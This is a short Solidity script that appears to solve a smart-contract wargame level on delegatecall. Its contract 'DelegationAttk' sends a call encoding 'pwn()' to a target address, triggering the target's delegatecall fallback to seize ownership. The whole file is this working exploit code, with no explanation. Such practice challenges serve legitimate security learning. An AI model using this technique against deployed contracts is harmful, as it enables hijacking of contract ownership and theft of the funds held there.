// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {console} from "forge-std/Script.sol";
import {Broadcasted} from "./Broadcasted.sol";

contract DelegationAttk is Broadcasted {
    function attack(address payable delegationCtr_) public payable override {
        delegationCtr_.call(_getSignature());
    }

    function _getSignature() private pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }
}
